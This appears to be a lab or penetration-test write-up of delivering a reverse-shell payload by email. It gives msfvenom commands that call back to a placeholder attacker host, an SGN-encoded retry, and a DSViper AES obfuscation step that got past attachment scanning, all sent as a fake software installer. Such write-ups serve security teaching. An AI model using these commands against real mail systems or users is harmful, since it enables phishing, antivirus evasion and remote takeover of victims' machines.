# Bypassing Email Security: Advanced Payload Obfuscation

## Overview

This writeup details a successful attack that involved bypassing email security mechanisms to deliver a malicious payload. When initial attempts to send a malicious executable were blocked, we employed advanced payload obfuscation techniques to evade detection and successfully establish a reverse shell connection.

## Tools Used

- Metasploit Framework
- msfvenom (payload generation)
- SGN encoder (initial obfuscation attempt)
- DSViper (successful payload obfuscation)
- Email client

## Attack Methodology

### 1. Initial Access and Reconnaissance

- Gained access to the target's email server using provided credentials
- Examined inbox contents to understand the target's requirements
- Identified an email where the target was requesting software installation files

### 2. Initial Payload Attempt

- Created a malicious executable using msfvenom to establish a reverse shell
  ```
  msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f exe > software.exe
  ```
- Attempted to send the payload as an email attachment
- Discovered that the attachment was automatically removed during transmission

### 3. Security Analysis

- Hypothesized that an email security system or antivirus was scanning attachments
- Tested the hypothesis by sending a benign .exe file with no malicious code
- Confirmed that legitimate executables were allowed through
- Concluded that the security system was detecting malicious signatures in our payload

### 4. Initial Evasion Attempt

- Attempted to encode the payload using the SGN (Shikata Ga Nai) encoder
  ```
  msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -e x86/shikata_ga_nai -f exe > encoded_payload.exe
  ```
- Discovered that the encoded payload was still detected and removed
- Determined that more sophisticated obfuscation was required

### 5. Advanced Obfuscation

- Researched more advanced payload obfuscation techniques
- Selected the DSViper tool for its ability to disguise payloads effectively
- Used DSViper with the self-injection (AES) option to obfuscate the same metasploit payload
  ```
  python dsviper.py -p windows/shell_reverse_tcp -o obfuscated_payload.exe --self-inject aes
  ```

### 6. Successful Delivery

- Sent the obfuscated payload as an email attachment
- Confirmed that the attachment was not removed by the security system
- Successfully established a reverse shell connection when the target executed the file

## Conclusion

This attack demonstrates the importance of understanding and adapting to security controls. When initial attempts were blocked, we analyzed the security mechanism and developed a targeted approach to bypass it. The key insight was recognizing that standard encoding techniques (SGN) were insufficient, and more advanced obfuscation methods (DSViper with AES encryption) were required to evade detection.
